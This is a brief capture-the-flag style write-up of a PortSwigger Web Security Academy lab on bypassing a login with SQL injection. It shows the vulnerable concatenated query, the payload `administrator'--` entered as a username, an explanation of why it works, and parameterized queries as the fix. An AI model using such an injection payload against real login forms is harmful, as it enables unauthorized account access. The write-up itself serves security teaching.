# SQL Injection — Login Bypass

**Lab:** SQL injection vulnerability allowing login bypass
**Source:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Apprentice

## Goal
Log in as `administrator` via SQLi.

## Vulnerability
Login query built with string concat. No sanitization.

Likely query:
```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'
```

## Steps
1. Open lab.

![Lab open](content/assets/portswigger_sqli_login_bypass/01-lab-open.png)

2. Navigate to login page, enter username `administrator'--` and any password (e.g. `x`).

![Payload entered](content/assets/portswigger_sqli_login_bypass/03-payload-entered.png)

3. Submit the login form.

## Why it works
Payload closes quote, comments out password check.

Query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'x'
```
`--` comments rest. Password check skipped. Logs in as administrator.

## Result
Access administrator account. Lab solved.

![Lab solved](content/assets/portswigger_sqli_login_bypass/04-lab-solved.png)

## Fix
Use parameterized queries. Never concat user input into SQL.
